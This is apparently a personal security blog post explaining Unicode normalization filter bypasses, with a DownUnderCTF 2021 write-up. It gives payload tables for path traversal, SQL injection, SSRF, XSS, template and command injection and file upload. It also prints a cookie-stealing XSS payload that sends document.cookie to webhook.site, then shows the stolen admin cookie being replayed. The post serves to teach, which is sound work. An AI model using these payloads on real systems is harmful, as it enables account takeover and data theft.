<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Unicode normalization vulnerabilities | Lazar</title>
<meta name="keywords" content="OSWE, Web hacking, CTF, XSS, Bypass" />
<meta name="description" content="Very simple yet interesting web bypass technique">
<meta name="author" content="Lazar">
<link rel="canonical" href="https://lazarpostenje.github.io/posts/unicode-normalization-vulnerabilities/" />

<script>

var host = "lazarv.com";
    if ((host == window.location.host) && (window.location.protocol != "https:")){
        
        window.location.protocol = "https";
        
    }
</script>

<script src="http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>


<style>
    
    body,
html {
    height: 100%;
}

#particles-js canvas {
    display: block;
    
    -webkit-transform: scale(1);
    -ms-transform: scale(1);
    transform: scale(1);
    opacity: 1;
    -webkit-transition: opacity .8s ease, -webkit-transform 1.4s ease;
    transition: opacity .8s ease, transform 1.4s ease
}

#particles-js {
    width: 100%;
    height: 100%;
    position: fixed;
    z-index: -10;
    top: 0;
    left: 0
}
    
    </style>
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.a5fbbdacac0b93b9e22ad582043fc0e2fa61ae067848cfa5eefd44c142e202b8.css" integrity="sha256-pfu9rKwLk7niKtWCBD/A4vphrgZ4SM&#43;l7v1EwULiArg=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://lazarpostenje.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://lazarpostenje.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://lazarpostenje.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://lazarpostenje.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://lazarpostenje.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.87.0" />
<meta property="og:title" content="Unicode normalization vulnerabilities" />
<meta property="og:description" content="Very simple yet interesting web bypass technique" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lazarpostenje.github.io/posts/unicode-normalization-vulnerabilities/" /><meta property="og:image" content="https://lazarpostenje.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-30T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-09-30T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://lazarpostenje.github.io/papermod-cover.png"/>

<meta name="twitter:title" content="Unicode normalization vulnerabilities"/>
<meta name="twitter:description" content="Very simple yet interesting web bypass technique"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://lazarpostenje.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Unicode normalization vulnerabilities",
      "item": "https://lazarpostenje.github.io/posts/unicode-normalization-vulnerabilities/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Unicode normalization vulnerabilities",
  "name": "Unicode normalization vulnerabilities",
  "description": "Very simple yet interesting web bypass technique",
  "keywords": [
    "OSWE", "Web hacking", "CTF", "XSS", "Bypass"
  ],
  "articleBody": "What is Unicode? Unicode or formally Unicode Standard is ab information technology standard for the consistent encoding, representation, and handling of text expressed in most of the world’s writing systems.\nRepresentation For example “A” is mapped to U+0041 and “a” is mapped to U+0061. Unicode characters exist from U+000000 to U+10FFFF (there are more than a million symbols). Unicode divides all these possible symbols into “planes”, the best known is the BMP (Basic Multilingual Plane) that goes from U+0000 to U+FFFF (it is the unicode plane number 1, there are 16 more, called “astral planes”).\nThe Unicode characters of the so-called “astral” planes can also be represented as “surrogate pairs” in UTF-16. Read more\n Unicode equivalence Unicode equivalence or Unicode normalization is the specification by the Unicode character encoding standard that some sequences of code points represent essentially the same character. On a more technical level, normalization ensures two strings that may use a different binary representation for their characters have the same binary value after normalization.\nCanonical Equivalence Canonical equivalent characters are assumed to have the same appearance and meaning when printed or displayed.\nCompatibility Equivalence Compatibility equivalence a weaker equivalence, in that two values may represent the same abstract character but can be displayed differently.\nNormalization algorithms There are 4 Normalization algorithms defined by the Unicode standard; NFC, NFD, NFKD and NFKD, each applies Canonical and Compatibility normalization techniques in a different way. You can read more on the different techniques at unicode.org.\n NFC: Normalization Form Canonical Composition NFD: Normalization Form Canonical Decomposition NFKC: Normalization Form Compatibility Composition NFKD: Normalization Form Compatibility Decomposition  The general idea behind all of these algorithms is to “normalize” some code-points to end up having the same character.\n What is the impact? What can we, as attackers do with unicode?\nPath traversal    Character Payload After Normalization     ‥ (U+2025) ‥/‥/‥/etc/passwd ../../../etc/passwd   ︰(U+FE30) ︰/︰/︰/etc/passwd ../../../etc/passwd     SQL Injection    Character Payload After Normalization     ＇(U+FF07) ＇ or ＇1＇=＇1 ’ or ‘1’=’1   ＂(U+FF02) ＂ or ＂1＂=＂1 ” or “1”=”1   ﹣ (U+FE63) admin＇﹣﹣ admin’–     Server-Side Request Forgery - SSRF    Character Payload After Normalization     ⓪ (U+24EA) ①②⑦.⓪.⓪.① 127.0.0.1     Open Redirect    Character Payload After Normalization     。(U+3002) lazarv。com lazarv.com   ／(U+FF0F) ／／lazarv.com //lazarv.com     Cross Site Scripting - XSS    Character Payload After Normalization     ＜(U+FF1C) ＜script src=a／＞ ＜script src=a/   ＂(U+FF02) ＂onclick=＇prompt(1)＇ “onclick=’prompt(1)’     Template Injection - SSTI and CSTI    Character Payload After Normalization     ﹛(U+FE5B) ﹛﹛3+3﹜﹜ {{3+3}}   ［ (U+FF3B) ［［5+5］］ [[5+5]]     OS Command Injection    Character Payload After Normalization     ＆ (U+FF06) ＆＆whoami \u0026\u0026whoami   ｜ (U+FF5C) ｜｜ whoami       Arbitrary file upload     Character Payload After Normalization     ｐ (U+FF50) ʰ (U+02B0) shell.ｐʰｐ shell.php     Chain reaction writeup from DownUnderCTF 2021 Upon visiting the main page, we see an option to register or login:\nRegister whatever account and login:\nAfter logging in, we are presented with the option to visit our profile in the upper right corner of page:\nOn our profile page, we’re able to update our username and “About me” text with ability to report current page to admin:\nThis might be an opportunity to XSS the page, but after inserting alert(1) I get redirected to this page:\nAt this point we know that some kind of input sanitization or character black listing is being performed. After trial and error, I decided to try encoding blacklisted characters with unicode equivalents. Unicode Normalization reference table\nI intercepted the update information request in Burp Suite and successfully broke out of HTML by injecting \"\" test in unicode format and escaped from the HTML:\nusername=lazar\u0026aboutme=%ef%bc%82%ef%bc%82%ef%b9%a5 test This means that I can inject a simple cookie stealer which will send me the cookie in base64 and enable me to log in as admin when he reviews the reported page. I injected the following JavaScript PoC:\n%ef%bc%82%ef%bc%82%ef%b9%a5%ef%b9%a4scri%e1%b5%96t%ef%b9%a5 var i = new Image(); i.src='https://webhook.site/MYID?' %2b btoa(document.cookie) %ef%b9%a4/scri%e1%b5%96t%ef%b9%a5 Which translates to:\nHere I am creating a new image element and setting its src attribute to point to an online webhook link I created and appending user’s cookie, using document.cookie function and encoding it to base64 using btoa native javascript function.\nAfter pressing “Report Error” button on the page, my webhook came with appended base64 value:\nDecoding base64 we get admin-cookie value:\nI applied the cookie to my current session by opening developer tools and executing the following:\ndocument.cookie = \"admin-cookie=COOKIE_VALUE\" Now we are able to access /admin endpoint which holds the flag:\n",
  "wordCount" : "713",
  "inLanguage": "en",
  "datePublished": "2021-09-30T00:00:00Z",
  "dateModified": "2021-09-30T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lazar"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://lazarpostenje.github.io/posts/unicode-normalization-vulnerabilities/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Lazar",
    "logo": {
      "@type": "ImageObject",
      "url": "https://lazarpostenje.github.io/favicon.ico"
    }
  }
}
</script>
    
</head>

<body class=" dark" id="top">
    <div id="particles-js"></div>
    
    <script>


particlesJS("particles-js", {
  
  "particles":{"number":{"value":40,"density":{"enable":true,"value_area":800}},"color":{"value":"#ffffff"},"shape":{"type":"circle","stroke":{"width":0,"color":"#000000"},"polygon":{"nb_sides":5},"image":{"src":"img/github.svg","width":100,"height":100}},"opacity":{"value":0.2244776885211732,"random":false,"anim":{"enable":false,"speed":1,"opacity_min":0.1,"sync":false}},"size":{"value":3,"random":true,"anim":{"enable":false,"speed":40,"size_min":0.1,"sync":false}},"line_linked":{"enable":true,"distance":150,"color":"#ffffff","opacity":0.4,"width":1},"move":{"enable":true,"speed":3.413648243462092,"direction":"none","random":false,"straight":false,"out_mode":"out","bounce":false,"attract":{"enable":false,"rotateX":801.7060304327614,"rotateY":1200}}},"interactivity":{"detect_on":"canvas","events":{"onhover":{"enable":false,"mode":"repulse"},"onclick":{"enable":false,"mode":"remove"},"resize":true},"modes":{"grab":{"distance":400,"line_linked":{"opacity":1}},"bubble":{"distance":400,"size":40,"duration":2,"opacity":8,"speed":3},"repulse":{"distance":200,"duration":0.4},"push":{"particles_nb":4},"remove":{"particles_nb":2}}},"retina_detect":true});

</script>
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>
<noscript>
    <style type="text/css">
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://lazarpostenje.github.io" accesskey="h" title="Lazar (Alt + H)">Lazar</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://lazarpostenje.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://lazarpostenje.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://lazarpostenje.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://lazarpostenje.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://lazarpostenje.github.io">Home</a>&nbsp;»&nbsp;<a href="https://lazarpostenje.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Unicode normalization vulnerabilities
    </h1>
    <div class="post-description">
      Very simple yet interesting web bypass technique
    </div>
    <div class="post-meta">September 30, 2021&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Lazar
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <div class="details">Table of Contents</div>
        </summary>
        <div class="inner"><ul>
                <li>
                    <a href="#what-is-unicode" aria-label="What is Unicode?">What is Unicode?</a><ul>
                        
                <li>
                    <a href="#representation" aria-label="Representation">Representation</a></li></ul>
                </li>
                <li>
                    <a href="#unicode-equivalence" aria-label="Unicode equivalence">Unicode equivalence</a><ul>
                        
                <li>
                    <a href="#canonical-equivalence" aria-label="Canonical Equivalence">Canonical Equivalence</a></li>
                <li>
                    <a href="#compatibility-equivalence" aria-label="Compatibility Equivalence">Compatibility Equivalence</a></li>
                <li>
                    <a href="#normalization-algorithms" aria-label="Normalization algorithms">Normalization algorithms</a></li></ul>
                </li>
                <li>
                    <a href="#what-is-the-impact" aria-label="What is the impact?">What is the impact?</a><ul>
                        
                <li>
                    <a href="#path-traversal" aria-label="Path traversal">Path traversal</a></li>
                <li>
                    <a href="#sql-injection" aria-label="SQL Injection">SQL Injection</a></li>
                <li>
                    <a href="#server-side-request-forgery---ssrf" aria-label="Server-Side Request Forgery - SSRF">Server-Side Request Forgery - SSRF</a></li>
                <li>
                    <a href="#open-redirect" aria-label="Open Redirect">Open Redirect</a></li>
                <li>
                    <a href="#cross-site-scripting---xss" aria-label="Cross Site Scripting - XSS">Cross Site Scripting - XSS</a></li>
                <li>
                    <a href="#template-injection---ssti-and-csti" aria-label="Template Injection - SSTI and CSTI">Template Injection - SSTI and CSTI</a></li>
                <li>
                    <a href="#os-command-injection" aria-label="OS Command Injection">OS Command Injection</a></li></ul>
                </li>
                <li>
                    <a href="#chain-reaction-writeup-from-downunderctf-2021" aria-label="Chain reaction writeup from DownUnderCTF 2021">Chain reaction writeup from DownUnderCTF 2021</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="what-is-unicode">What is Unicode?<a hidden class="anchor" aria-hidden="true" href="#what-is-unicode">#</a></h1>
<p><strong>Unicode</strong> or formally <strong>Unicode Standard</strong> is ab information technology standard for the consistent encoding, representation, and handling of text expressed in most of the world&rsquo;s writing systems.</p>
<h2 id="representation">Representation<a hidden class="anchor" aria-hidden="true" href="#representation">#</a></h2>
<p>For example &ldquo;A&rdquo; is mapped to <strong>U+0041</strong> and &ldquo;a&rdquo; is mapped to <strong>U+0061</strong>. Unicode characters exist from <strong>U+000000</strong> to <strong>U+10FFFF</strong> (there are more than a million symbols). Unicode divides all these possible symbols into &ldquo;planes&rdquo;, the best known is the <strong>BMP</strong> (<em>Basic Multilingual Plane</em>) that goes from <strong>U+0000</strong> to <strong>U+FFFF</strong> (it is the unicode plane number 1, there are 16 more, called &ldquo;astral planes&rdquo;).</p>
<p>The Unicode characters of the so-called &ldquo;astral&rdquo; planes can also be represented as &ldquo;surrogate pairs&rdquo; in <strong>UTF-16</strong>. <a href="https://en.wikipedia.org/wiki/UTF-16">Read more</a></p>
<hr>
<h1 id="unicode-equivalence">Unicode equivalence<a hidden class="anchor" aria-hidden="true" href="#unicode-equivalence">#</a></h1>
<p><strong>Unicode equivalence</strong> or <strong>Unicode normalization</strong> is the specification by the Unicode character encoding standard that some sequences of code points represent essentially the same character. On a more technical level, normalization ensures two strings that may use a different binary representation for their characters have the same binary value after normalization.</p>
<h2 id="canonical-equivalence">Canonical Equivalence<a hidden class="anchor" aria-hidden="true" href="#canonical-equivalence">#</a></h2>
<p><strong>Canonical equivalent</strong> characters are assumed to have the same appearance and meaning when printed or displayed.</p>
<h2 id="compatibility-equivalence">Compatibility Equivalence<a hidden class="anchor" aria-hidden="true" href="#compatibility-equivalence">#</a></h2>
<p><strong>Compatibility equivalence</strong> a weaker equivalence, in that two values may represent the same abstract character but can be displayed differently.</p>
<h2 id="normalization-algorithms">Normalization algorithms<a hidden class="anchor" aria-hidden="true" href="#normalization-algorithms">#</a></h2>
<p>There are <strong>4 Normalization algorithms</strong> defined by the <strong>Unicode</strong> standard; <strong>NFC, NFD, NFKD and NFKD</strong>, each applies <strong>Canonical</strong> and <strong>Compatibility</strong> normalization techniques in a different way. You can read more on the different techniques at <a href="https://unicode.org">unicode.org</a>.</p>
<ul>
<li><strong>NFC:</strong> Normalization Form Canonical Composition</li>
<li><strong>NFD:</strong> Normalization Form Canonical Decomposition</li>
<li><strong>NFKC:</strong> Normalization Form Compatibility Composition</li>
<li><strong>NFKD:</strong> Normalization Form Compatibility Decomposition</li>
</ul>
<p>The general idea behind all of these algorithms is to &ldquo;normalize&rdquo; some code-points to end up having the same character.</p>
<hr>
<h1 id="what-is-the-impact">What is the impact?<a hidden class="anchor" aria-hidden="true" href="#what-is-the-impact">#</a></h1>
<p>What can we, as attackers do with unicode?</p>
<h2 id="path-traversal">Path traversal<a hidden class="anchor" aria-hidden="true" href="#path-traversal">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>‥ (U+2025)</td>
<td>‥/‥/‥/etc/passwd</td>
<td>../../../etc/passwd</td>
</tr>
<tr>
<td>︰(U+FE30)</td>
<td>︰/︰/︰/etc/passwd</td>
<td>../../../etc/passwd</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="sql-injection">SQL Injection<a hidden class="anchor" aria-hidden="true" href="#sql-injection">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>＇(U+FF07)</td>
<td>＇ or ＇1＇=＇1</td>
<td>’ or ‘1’=’1</td>
</tr>
<tr>
<td>＂(U+FF02)</td>
<td>＂ or ＂1＂=＂1</td>
<td>” or “1”=”1</td>
</tr>
<tr>
<td>﹣ (U+FE63)</td>
<td>admin＇﹣﹣</td>
<td>admin’–</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="server-side-request-forgery---ssrf">Server-Side Request Forgery - SSRF<a hidden class="anchor" aria-hidden="true" href="#server-side-request-forgery---ssrf">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>⓪ (U+24EA)</td>
<td>①②⑦.⓪.⓪.①</td>
<td>127.0.0.1</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="open-redirect">Open Redirect<a hidden class="anchor" aria-hidden="true" href="#open-redirect">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>。(U+3002)</td>
<td>lazarv。com</td>
<td>lazarv.com</td>
</tr>
<tr>
<td>／(U+FF0F)</td>
<td>／／lazarv.com</td>
<td>//lazarv.com</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="cross-site-scripting---xss">Cross Site Scripting - XSS<a hidden class="anchor" aria-hidden="true" href="#cross-site-scripting---xss">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>＜(U+FF1C)</td>
<td>＜script src=a／＞</td>
<td>＜script src=a/&gt;</td>
</tr>
<tr>
<td>＂(U+FF02)</td>
<td>＂onclick=＇prompt(1)＇</td>
<td>“onclick=’prompt(1)’</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="template-injection---ssti-and-csti">Template Injection - SSTI and CSTI<a hidden class="anchor" aria-hidden="true" href="#template-injection---ssti-and-csti">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>﹛(U+FE5B)</td>
<td>﹛﹛3+3﹜﹜</td>
<td>{{3+3}}</td>
</tr>
<tr>
<td>［ (U+FF3B)</td>
<td>［［5+5］］</td>
<td>[[5+5]]</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="os-command-injection">OS Command Injection<a hidden class="anchor" aria-hidden="true" href="#os-command-injection">#</a></h2>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>＆ (U+FF06)</td>
<td>＆＆whoami</td>
<td>&amp;&amp;whoami</td>
</tr>
<tr>
<td>｜ (U+FF5C)</td>
<td>｜｜ whoami</td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<ul>
<li>Arbitrary file upload</li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody>
<tr>
<td>ｐ (U+FF50) ʰ (U+02B0)</td>
<td>shell.ｐʰｐ</td>
<td>shell.php</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="chain-reaction-writeup-from-downunderctf-2021">Chain reaction writeup from DownUnderCTF 2021<a hidden class="anchor" aria-hidden="true" href="#chain-reaction-writeup-from-downunderctf-2021">#</a></h1>
<p>Upon visiting the main page, we see an option to <strong>register</strong> or <strong>login</strong>:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc0.png#center" alt=""  />
</p>
<p>Register whatever account and login:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc1.png#center" alt=""  />
</p>
<p>After logging in, we are presented with the option to visit our profile in the upper right corner of page:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc2.png#center" alt=""  />
</p>
<p>On our profile page, we&rsquo;re able to update our username and &ldquo;About me&rdquo; text with ability to report current page to admin:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc3.png#center" alt=""  />
</p>
<p>This might be an opportunity to XSS the page, but after inserting <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> I get redirected to this page:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc4.png#center" alt=""  />
</p>
<p>At this point we know that some kind of input sanitization or character black listing is being performed. After trial and error, I decided to try encoding blacklisted characters with unicode equivalents. <a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">Unicode Normalization reference table</a></p>
<p>I intercepted the update information request in Burp Suite and successfully broke out of HTML by injecting <code>&quot;&quot;&gt; test</code> in unicode format and escaped from the HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">username=lazar&amp;aboutme=%ef%bc%82%ef%bc%82%ef%b9%a5 test
</span></code></pre></div><p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc5.png#center" alt=""  />
</p>
<p>This means that I can inject a simple cookie stealer which will send me the cookie in base64 and enable me to log in as admin when he reviews the reported page. I injected the following JavaScript <strong>PoC</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">bc</span><span style="color:#f92672">%</span><span style="color:#ae81ff">82</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">bc</span><span style="color:#f92672">%</span><span style="color:#ae81ff">82</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b9</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a5</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b9</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a4scri</span><span style="color:#f92672">%</span><span style="color:#a6e22e">e1</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b5</span><span style="color:#f92672">%</span><span style="color:#ae81ff">96</span><span style="color:#a6e22e">t</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b9</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a5</span> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>(); <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://webhook.site/MYID?&#39;</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">b</span> <span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>)  <span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b9</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a4</span><span style="color:#f92672">/</span><span style="color:#a6e22e">scri</span><span style="color:#f92672">%</span><span style="color:#a6e22e">e1</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b5</span><span style="color:#f92672">%</span><span style="color:#ae81ff">96</span><span style="color:#a6e22e">t</span><span style="color:#f92672">%</span><span style="color:#a6e22e">ef</span><span style="color:#f92672">%</span><span style="color:#a6e22e">b9</span><span style="color:#f92672">%</span><span style="color:#a6e22e">a5</span>
</code></pre></div><p>Which translates to:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc6.png#center" alt=""  />
</p>
<p>Here I am creating a new image element and setting its <code>src</code> attribute to point to an online webhook link I created and appending user&rsquo;s cookie, using <code>document.cookie</code> function and encoding it to <strong>base64</strong> using <code>btoa</code> native javascript function.</p>
<p>After pressing &ldquo;Report Error&rdquo; button on the page, my webhook came with appended base64 value:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc7.png#center" alt=""  />
</p>
<p>Decoding base64 we get <code>admin-cookie</code> value:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc8.png#center" alt=""  />
</p>
<p>I applied the cookie to my current session by opening developer tools and executing the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin-cookie=COOKIE_VALUE&#34;</span>
</code></pre></div><p>Now we are able to access /admin endpoint which holds the flag:</p>
<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/picc9.png#center" alt=""  />
</p>


  </div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://lazarpostenje.github.io/tags/oswe/">OSWE</a></li>
      <li><a href="https://lazarpostenje.github.io/tags/web-hacking/">Web hacking</a></li>
      <li><a href="https://lazarpostenje.github.io/tags/ctf/">CTF</a></li>
      <li><a href="https://lazarpostenje.github.io/tags/xss/">XSS</a></li>
      <li><a href="https://lazarpostenje.github.io/tags/bypass/">Bypass</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://lazarpostenje.github.io/posts/bypassing-file-upload-restrictions/">
    <span class="title">Next Page »</span>
    <br>
    <span>Bypassing file upload restrictions</span>
  </a>
</nav>

<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on twitter"
        href="https://twitter.com/intent/tweet/?text=Unicode%20normalization%20vulnerabilities&amp;url=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f&amp;hashtags=OSWE%2cWeb%e2%80%80hacking%2cCTF%2cXSS%2cBypass">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on linkedin"
